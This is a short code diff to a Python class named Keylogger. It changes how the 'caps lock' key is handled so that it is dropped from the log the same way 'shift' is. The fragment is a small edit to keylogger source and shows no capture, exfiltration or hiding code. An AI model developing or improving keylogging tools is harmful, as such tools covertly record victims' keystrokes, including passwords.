@@ -91,7 +91,7 @@ class Keylogger:
                 self.log = self.log[:-1]
             elif name == "ctrl":
                 name = ""
-            elif name == "shift":
+            elif name == "shift" or name == "caps lock":
                 name = ""
             # else:
             #     name = name.replace(" ", "_")
